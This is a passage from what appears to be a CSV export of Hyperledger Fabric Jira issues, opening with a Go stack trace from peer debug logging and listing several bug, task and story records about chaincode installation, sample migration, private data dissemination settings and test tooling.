github.com/hyperledger/fabric/core/endorser.(*Endorser).ProcessProposal(0xc002303f20, 0x518dfa0, 0xc0023c5200, 0xc002275450, 0x0, 0x0, 0x0)
	/Users/denyeart/work/src/github.com/hyperledger/fabric/core/endorser/endorser.go:335 +0x380
github.com/hyperledger/fabric/core/handlers/auth/filter.(*expirationCheckFilter).ProcessProposal(0xc0023088a0, 0x518dfa0, 0xc0023c5200, 0xc002275450, 0x4db9d00, 0x0, 0x6e38270)
	/Users/denyeart/work/src/github.com/hyperledger/fabric/core/handlers/auth/filter/expiration.go:61 +0x8f
github.com/hyperledger/fabric/core/handlers/auth/filter.(*filter).ProcessProposal(0xc002308840, 0x518dfa0, 0xc0023c5200, 0xc002275450, 0xc002308840, 0x20, 0xfe)
	/Users/denyeart/work/src/github.com/hyperledger/fabric/core/handlers/auth/filter/filter.go:32 +0x51
github.com/hyperledger/fabric/vendor/github.com/hyperledger/fabric-protos-go/peer._Endorser_ProcessProposal_Handler.func1(0x518dfa0, 0xc0023c5200, 0x4ec6be0, 0xc002275450, 0x0, 0xc0023eedfe, 0x518dfa0, 0xc0023c5200)
	/Users/denyeart/work/src/github.com/hyperledger/fabric/vendor/github.com/hyperledger/fabric-protos-go/peer/peer.pb.go:107 +0x86
github.com/hyperledger/fabric/common/grpclogging.UnaryServerInterceptor.func1(0x518dfa0, 0xc0023c5050, 0x4ec6be0, 0xc002275450, 0xc0023eece0, 0xc0023eed00, 0x40cf366, 0x5e32fefc, 0x39ac5bc8, 0x4c476bb51fb5e)
	/Users/denyeart/work/src/github.com/hyperledger/fabric/common/grpclogging/server.go:92 +0x286
github.com/hyperledger/fabric/vendor/github.com/grpc-ecosystem/go-grpc-middleware.ChainUnaryServer.func1.1.1(0x518dfa0, 0xc0023c5050, 0x4ec6be0, 0xc002275450, 0x516fd60, 0x5b7fa78, 0x4e40940, 0xbb51eb0b)
	/Users/denyeart/work/src/github.com/hyperledger/fabric/vendor/github.com/grpc-ecosystem/go-grpc-middleware/chain.go:25 +0x63
github.com/hyperledger/fabric/common/grpcmetrics.UnaryServerInterceptor.func1(0x518dfa0, 0xc0023c5050, 0x4ec6be0, 0xc002275450, 0xc0023eece0, 0xc0023eed20, 0x45c2bca, 0x4e67a40, 0xc0023eed40, 0xc0023eece0)
	/Users/denyeart/work/src/github.com/hyperledger/fabric/common/grpcmetrics/interceptor.go:31 +0x1c9
github.com/hyperledger/fabric/vendor/github.com/grpc-ecosystem/go-grpc-middleware.ChainUnaryServer.func1.1.1(0x518dfa0, 0xc0023c5050, 0x4ec6be0, 0xc002275450, 0xc0003db600, 0xc0023eec60, 0xc0031d5a10, 0x400f378)
	/Users/denyeart/work/src/github.com/hyperledger/fabric/vendor/github.com/grpc-ecosystem/go-grpc-middleware/chain.go:25 +0x63
github.com/hyperledger/fabric/vendor/github.com/grpc-ecosystem/go-grpc-middleware.ChainUnaryServer.func1(0x518dfa0, 0xc0023c5050, 0x4ec6be0, 0xc002275450, 0xc0023eece0, 0xc0023eed00, 0xc0003e4a80, 0x41eca68, 0x4e9a3e0, 0xc0023c5050)
	/Users/denyeart/work/src/github.com/hyperledger/fabric/vendor/github.com/grpc-ecosystem/go-grpc-middleware/chain.go:34 +0xd5
github.com/hyperledger/fabric/vendor/github.com/hyperledger/fabric-protos-go/peer._Endorser_ProcessProposal_Handler(0x4db9d00, 0xc002308840, 0x518dfa0, 0xc0023c5050, 0xc0023c1740, 0xc0001c9140, 0x518dfa0, 0xc0023c5050, 0xc0002df200, 0x45c)
	/Users/denyeart/work/src/github.com/hyperledger/fabric/vendor/github.com/hyperledger/fabric-protos-go/peer/peer.pb.go:109 +0x14b
github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*Server).processUnaryRPC(0xc0001d2b00, 0x519cf40, 0xc00230ed80, 0xc0003db600, 0xc002503440, 0x5b2b0c0, 0xc0004b5540, 0x0, 0x0)
	/Users/denyeart/work/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:995 +0x460
github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*Server).handleStream(0xc0001d2b00, 0x519cf40, 0xc00230ed80, 0xc0003db600, 0xc0004b5540)
	/Users/denyeart/work/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:1275 +0xd97
github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*Server).serveStreams.func1.1(0xc0023c67f0, 0xc0001d2b00, 0x519cf40, 0xc00230ed80, 0xc0003db600)
	/Users/denyeart/work/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:710 +0xbb
created by github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*Server).serveStreams.func1
	/Users/denyeart/work/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:708 +0xa1

2020-01-30 11:06:20.999 EST [statecouchdb] GetState -> DEBU 162 GetState(). ns=_lifecycle, key=namespaces/fields/marbles/Sequence
goroutine 206 [running]:
runtime/debug.Stack(0x0, 0x0, 0x0)
	/usr/local/go/src/runtime/debug/stack.go:24 +0x9d
runtime/debug.PrintStack()
	/usr/local/go/src/runtime/debug/stack.go:16 +0x22
github.com/hyperledger/fabric/core/ledger/kvledger/txmgmt/statedb/statecouchdb.(*VersionedDB).GetState(0xc000155340, 0x4f87b50, 0xa, 0xc0000d9170, 0x22, 0x8, 0xc0031e2598, 0x0)
	/Users/denyeart/work/src/github.com/hyperledger/fabric/core/ledger/kvledger/txmgmt/statedb/statecouchdb/statecouchdb.go:371 +0x12e
github.com/hyperledger/fabric/core/ledger/kvledger/txmgmt/txmgr/lockbasedtxmgr.(*queryHelper).getState(0xc003204120, 0x4f87b50, 0xa, 0xc0000d9170, 0x22, 0x4070c3c, 0x5b2d640, 0xc000460d80, 0x3, 0xc0031e2690, ...)
	/Users/denyeart/work/src/github.com/hyperledger/fabric/core/ledger/kvledger/txmgmt/txmgr/lockbasedtxmgr/helper.go:55 +0x8c
github.com/hyperledger/fabric/core/ledger/kvledger/txmgmt/txmgr/lockbasedtxmgr.(*lockBasedQueryExecutor).GetState(0xc003208060, 0x4f87b50, 0xa, 0xc0000d9170, 0x22, 0x0, 0x0, 0x0, 0x0, 0x0)
	/Users/denyeart/work/src/github.com/hyperledger/fabric/core/ledger/kvledger/txmgmt/txmgr/lockbasedtxmgr/lockbased_query_executer.go:28 +0x66
github.com/hyperledger/fabric/core/chaincode/lifecycle.(*SimpleQueryExecutorShim).GetState(0xc00389c160, 0xc0000d9170, 0x22, 0x4, 0x4, 0xc0000d9170, 0x22, 0x5b62c00)
	/Users/denyeart/work/src/github.com/hyperledger/fabric/core/chaincode/lifecycle/ledger_shim.go:121 +0x5d
github.com/hyperledger/fabric/core/chaincode/lifecycle.(*Serializer).DeserializeField(0xc0000daa38, 0x4f8808c, 0xa, 0xc0023c6f40, 0x7, 0x4f85648, 0x8, 0x515e000, 0xc00389c160, 0x20, ...)
	/Users/denyeart/work/src/github.com/hyperledger/fabric/core/chaincode/lifecycle/serializer.go:380 +0x19f
github.com/hyperledger/fabric/core/chaincode/lifecycle.(*Serializer).DeserializeFieldAsInt64(0xc0000daa38, 0x4f8808c, 0xa, 0xc0023c6f40, 0x7, 0x4f85648, 0x8, 0x515e000, 0xc00389c160, 0x20, ...)
	/Users/denyeart/work/src/github.com/hyperledger/fabric/core/chaincode/lifecycle/serializer.go:437 +0xa8
github.com/hyperledger/fabric/core/chaincode/lifecycle.(*ChaincodeEndorsementInfoSource).CachedChaincodeInfo(0xc0022daea0, 0xc0023c6f00, 0x9, 0xc0023c6f40, 0x7, 0xa600af0, 0xc003208060, 0x0, 0xc0031e2a90, 0x400ca15, ...)
	/Users/denyeart/work/src/github.com/hyperledger/fabric/core/chaincode/lifecycle/endorsment_info.go:65 +0x114
github.com/hyperledger/fabric/core/chaincode/lifecycle.(*ChaincodeEndorsementInfoSource).ChaincodeEndorsementInfo(0xc0022daea0, 0xc0023c6f00, 0x9, 0xc0023c6f40, 0x7, 0xa600af0, 0xc003208060, 0x0, 0x0, 0x0)
	/Users/denyeart/work/src/github.com/hyperledger/fabric/core/chaincode/lifecycle/endorsment_info.go:112 +0x1ed
github.com/hyperledger/fabric/core/chaincode.(*ChaincodeSupport).CheckInvocation(0xc00024a840, 0xc0031ee200, 0xc0023c6f40, 0x7, 0xc0031ea0f0, 0x30, 0xc003208930, 0xc000099800, 0x68ae460, 0xc000099800)
	/Users/denyeart/work/src/github.com/hyperledger/fabric/core/chaincode/chaincode_support.go:211 +0x238
github.com/hyperledger/fabric/core/chaincode.(*ChaincodeSupport).Invoke(0xc00024a840, 0xc0031ee200, 0xc0023c6f40, 0x7, 0xc0031ea0f0, 0x5b7fa78, 0xc0002bebd0, 0xc0031ea0f0)
	/Users/denyeart/work/src/github.com/hyperledger/fabric/core/chaincode/chaincode_support.go:192 +0x63
github.com/hyperledger/fabric/core/chaincode.(*ChaincodeSupport).Execute(0xc00024a840, 0xc0031ee200, 0xc0023c6f40, 0x7, 0xc0031ea0f0, 0xc0031ea0f0, 0x0, 0x0, 0x515e480)
	/Users/denyeart/work/src/github.com/hyperledger/fabric/core/chaincode/chaincode_support.go:155 +0x5d
github.com/hyperledger/fabric/core/endorser.(*SupportImpl).Execute(0xc0022cb5e0, 0xc0031ee200, 0xc0023c6f40, 0x7, 0xc0031ea0f0, 0xc0031e2dc0, 0x43e1136, 0x4defb80, 0xc000138698)
	/Users/denyeart/work/src/github.com/hyperledger/fabric/core/endorser/support.go:126 +0x15a
github.com/hyperledger/fabric/core/endorser.(*Endorser).callChaincode(0xc002303f20, 0xc0031ee200, 0xc0031ea0f0, 0xc0023c6f40, 0x7, 0x0, 0x0, 0x0, 0x0)
	/Users/denyeart/work/src/github.com/hyperledger/fabric/core/endorser/endorser.go:119 +0x1a2
github.com/hyperledger/fabric/core/endorser.(*Endorser).SimulateProposal(0xc002303f20, 0xc0031ee200, 0xc0023c6f40, 0x7, 0xc0031ea0f0, 0x0, 0x0, 0x0, 0x0, 0x0, ...)
	/Users/denyeart/work/src/github.com/hyperledger/fabric/core/endorser/endorser.go:182 +0xd8
github.com/hyperledger/fabric/core/endorser.(*Endorser).ProcessProposalSuccessfullyOrError(0xc002303f20, 0xc0031ea500, 0x0, 0x0, 0x0)
	/Users/denyeart/work/src/github.com/hyperledger/fabric/core/endorser/endorser.go:392 +0x433
github.com/hyperledger/fabric/core/endorser.(*Endorser).ProcessProposal(0xc002303f20, 0x518dfa0, 0xc0023c5200, 0xc002275450, 0x0, 0x0, 0x0)
	/Users/denyeart/work/src/github.com/hyperledger/fabric/core/endorser/endorser.go:335 +0x380
github.com/hyperledger/fabric/core/handlers/auth/filter.(*expirationCheckFilter).ProcessProposal(0xc0023088a0, 0x518dfa0, 0xc0023c5200, 0xc002275450, 0x4db9d00, 0x0, 0x6e38270)
	/Users/denyeart/work/src/github.com/hyperledger/fabric/core/handlers/auth/filter/expiration.go:61 +0x8f
github.com/hyperledger/fabric/core/handlers/auth/filter.(*filter).ProcessProposal(0xc002308840, 0x518dfa0, 0xc0023c5200, 0xc002275450, 0xc002308840, 0x20, 0xfe)
	/Users/denyeart/work/src/github.com/hyperledger/fabric/core/handlers/auth/filter/filter.go:32 +0x51
github.com/hyperledger/fabric/vendor/github.com/hyperledger/fabric-protos-go/peer._Endorser_ProcessProposal_Handler.func1(0x518dfa0, 0xc0023c5200, 0x4ec6be0, 0xc002275450, 0x0, 0xc0023eedfe, 0x518dfa0, 0xc0023c5200)
	/Users/denyeart/work/src/github.com/hyperledger/fabric/vendor/github.com/hyperledger/fabric-protos-go/peer/peer.pb.go:107 +0x86
github.com/hyperledger/fabric/common/grpclogging.UnaryServerInterceptor.func1(0x518dfa0, 0xc0023c5050, 0x4ec6be0, 0xc002275450, 0xc0023eece0, 0xc0023eed00, 0x40cf366, 0x5e32fefc, 0x39ac5bc8, 0x4c476bb51fb5e)
	/Users/denyeart/work/src/github.com/hyperledger/fabric/common/grpclogging/server.go:92 +0x286
github.com/hyperledger/fabric/vendor/github.com/grpc-ecosystem/go-grpc-middleware.ChainUnaryServer.func1.1.1(0x518dfa0, 0xc0023c5050, 0x4ec6be0, 0xc002275450, 0x516fd60, 0x5b7fa78, 0x4e40940, 0xbb51eb0b)
	/Users/denyeart/work/src/github.com/hyperledger/fabric/vendor/github.com/grpc-ecosystem/go-grpc-middleware/chain.go:25 +0x63
github.com/hyperledger/fabric/common/grpcmetrics.UnaryServerInterceptor.func1(0x518dfa0, 0xc0023c5050, 0x4ec6be0, 0xc002275450, 0xc0023eece0, 0xc0023eed20, 0x45c2bca, 0x4e67a40, 0xc0023eed40, 0xc0023eece0)
	/Users/denyeart/work/src/github.com/hyperledger/fabric/common/grpcmetrics/interceptor.go:31 +0x1c9
github.com/hyperledger/fabric/vendor/github.com/grpc-ecosystem/go-grpc-middleware.ChainUnaryServer.func1.1.1(0x518dfa0, 0xc0023c5050, 0x4ec6be0, 0xc002275450, 0xc0003db600, 0xc0023eec60, 0xc0031d5a10, 0x400f378)
	/Users/denyeart/work/src/github.com/hyperledger/fabric/vendor/github.com/grpc-ecosystem/go-grpc-middleware/chain.go:25 +0x63
github.com/hyperledger/fabric/vendor/github.com/grpc-ecosystem/go-grpc-middleware.ChainUnaryServer.func1(0x518dfa0, 0xc0023c5050, 0x4ec6be0, 0xc002275450, 0xc0023eece0, 0xc0023eed00, 0xc0003e4a80, 0x41eca68, 0x4e9a3e0, 0xc0023c5050)
	/Users/denyeart/work/src/github.com/hyperledger/fabric/vendor/github.com/grpc-ecosystem/go-grpc-middleware/chain.go:34 +0xd5
github.com/hyperledger/fabric/vendor/github.com/hyperledger/fabric-protos-go/peer._Endorser_ProcessProposal_Handler(0x4db9d00, 0xc002308840, 0x518dfa0, 0xc0023c5050, 0xc0023c1740, 0xc0001c9140, 0x518dfa0, 0xc0023c5050, 0xc0002df200, 0x45c)
	/Users/denyeart/work/src/github.com/hyperledger/fabric/vendor/github.com/hyperledger/fabric-protos-go/peer/peer.pb.go:109 +0x14b
github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*Server).processUnaryRPC(0xc0001d2b00, 0x519cf40, 0xc00230ed80, 0xc0003db600, 0xc002503440, 0x5b2b0c0, 0xc0004b5540, 0x0, 0x0)
	/Users/denyeart/work/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:995 +0x460
github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*Server).handleStream(0xc0001d2b00, 0x519cf40, 0xc00230ed80, 0xc0003db600, 0xc0004b5540)
	/Users/denyeart/work/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:1275 +0xd97
github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*Server).serveStreams.func1.1(0xc0023c67f0, 0xc0001d2b00, 0x519cf40, 0xc00230ed80, 0xc0003db600)
	/Users/denyeart/work/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:710 +0xbb
created by github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*Server).serveStreams.func1
	/Users/denyeart/work/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:708 +0xa1 ",,denyeart,wenjian,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i008rj:iwryo",,,,Unset,Unset,v2.0,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,wenjian,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,release-2.0,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"31/Jan/20 5:44 AM;wenjian;PR: https://github.com/hyperledger/fabric/pull/608;;;","06/Feb/20 3:47 AM;denyeart;merged to master for 2.1, need to cherry pick to release-2.0 for 2.0.1.;;;","06/Feb/20 5:01 AM;wenjian;cherry pick PR: https://github.com/hyperledger/fabric/pull/638;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Failed to install sample java chaincode using k8s environemnt,FAB-17459,44208,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,bharadwajambati1,bharadwajambati1,01/Feb/20 12:36 AM,16/Apr/20 11:54 AM,28/Oct/23 3:09 AM,16/Apr/20 11:54 AM,v2.0.0,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,,,bharadwajambati1,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i018lf:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),bharadwajambati1,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"16/Apr/20 11:53 AM;btl5037;This was fixed, PTE was not honoring the install chaincode timeout, so the additional time required to build the JavaCC was hitting the Fabric default timeout due to the speed of building the images using DinD. Honoring the PTE timeout fixed the problem.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Move High througput sample to test network,FAB-17460,44209,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,negupta,negupta,negupta,01/Feb/20 1:17 AM,20/Mar/20 11:50 PM,28/Oct/23 3:09 AM,20/Mar/20 11:50 PM,,,,,,,,,,v2.0.0,,,,fabric-samples,,,,,,,,,0,,,,,,High through put sample currently runs on first-network,,negupta,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-16604,,,No,,Unset,No,,,"1|i018ln:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),negupta,,,,,,,,,,,,,,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-6.11.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/tough-cookie-4.1.3,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/semver-6.3.1,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/grpc/grpc-js-1.8.17,dependabot/go_modules/high-throughput/application-go/google.golang.org/grpc-1.53.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/word-wrap-1.2.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-and-fabric-network-7.2.4,dependabot/go_modules/asset-transfer-basic/application-go/google.golang.org/grpc-1.53.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"05/Feb/20 6:41 AM;negupta;https://github.com/hyperledger/fabric-samples/pull/112;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Move off_chain_data sample to test network,FAB-17461,44210,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,negupta,negupta,negupta,01/Feb/20 1:20 AM,20/Mar/20 11:50 PM,28/Oct/23 3:09 AM,20/Mar/20 11:50 PM,v2.0.0,,,,,,,,,,,,,fabric-samples,,,,,,,,,0,,,,,,Currently uses first-network,,negupta,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-16604,,,No,,Unset,No,,,"1|i018lv:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),negupta,,,,,,,,,,,,,,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-6.11.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/tough-cookie-4.1.3,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/semver-6.3.1,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/grpc/grpc-js-1.8.17,dependabot/go_modules/high-throughput/application-go/google.golang.org/grpc-1.53.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/word-wrap-1.2.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-and-fabric-network-7.2.4,dependabot/go_modules/asset-transfer-basic/application-go/google.golang.org/grpc-1.53.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Chaincode test tool should not overwrite existing vendored Go modules,FAB-17462,44218,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,awjh-ibm,awjh-ibm,03/Feb/20 7:10 PM,15/Feb/20 6:03 AM,28/Oct/23 3:09 AM,03/Feb/20 10:27 PM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,Currently the chaincode test tool always runs Go mod vendor on a Go contract. To allow for integration tests to provide their own Go package files wihtout having to put them in a shared volume on the docker images started up it should respect existing vendor folders.,,awjh-ibm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i018nn:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),awjh-ibm,,,,,,,,,,,,,,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,main,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,release-2.4,lindluni-patch-1,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,mergify/bp/release-2.2/pr-3750,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,mergify/bp/release-2.2/pr-4374,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Allow peer to override implicit collection dissemination properties,FAB-17463,44227,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wenjian,denyeart,denyeart,04/Feb/20 12:05 AM,28/Feb/20 11:31 PM,28/Oct/23 3:09 AM,28/Feb/20 11:31 PM,,,,,,,,,,v2.1.0,,,,fabric-ledger,,,,,,,,,0,,,,,,"FAB-17303  defaulted private data dissemination policies requiredPeerCount=0 and maxPeerCount=1 for implicit org-specific private data collections. However depending on number of peers your org has, and the amount of redundancy you desire for storing private data, you may want your peer to override these defaults with values in peer's core.yaml, for example:

{code:java}
peer.gossip.pvtData.ImplicitCollectionDisseminationPolicy.requiredPeerCount
peer.gossip.pvtData.ImplicitCollectionDisseminationPolicy.maxPeerCount
{code}

The override will apply to all channels the peer has joined. The implication is that requiredPeerCount has to be smaller than the number of peers in a channel that has the lowest numbers of peers from the org (this should be mentioned in the doc and/or core.yaml comments).

Acceptance criteria:

If requiredPeerCount or maxPeerCount are specified locally in core.yaml, when peer endorses a proposal that writes to its OWN implicit collection,  these values override the default values of 0 and 1 for disseminating private data.

Note that FAB-17491 will ensure that peer does not disseminate private data targeted for OTHER organization's implicit collections.
",,denyeart,wenjian,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17303,,,FAB-17491,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-10889,,,No,,Unset,No,,,"1|i00wur:0i9",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,wenjian,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"23/Feb/20 5:34 AM;wenjian;PR: https://github.com/hyperledger/fabric/pull/717;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
PTE returning success even though transaction is failed when using 2of endorsement policy,FAB-17464,44229,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dongming,suryalnvs,suryalnvs,04/Feb/20 12:18 AM,28/Feb/20 3:46 AM,28/Oct/23 3:09 AM,12/Feb/20 1:03 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,quality,,,,,"Description: PTE returning success even though transaction is failed when using 2of endorsement policy. 

Steps:
 # Launch network with 2 orgs and 1 peer in each
 # Create a channel, join both org peers to channel
 # Install any chaincode and instantiate with endorsement policy as 2of(org1,org2)
 # Send invokes to only org1
 # Verify peer of org1 logs validation failure
 # After completing invokes, PTE report says successful in receiving all transaction events

As transactions are failed to commit, PTE should return error and exit as failure.",,dongming,suryalnvs,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|hzwqrk:5iwr4rb12",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),dongming,suryalnvs,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,release-1.4,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,lindluni-patch-1,dependabot/go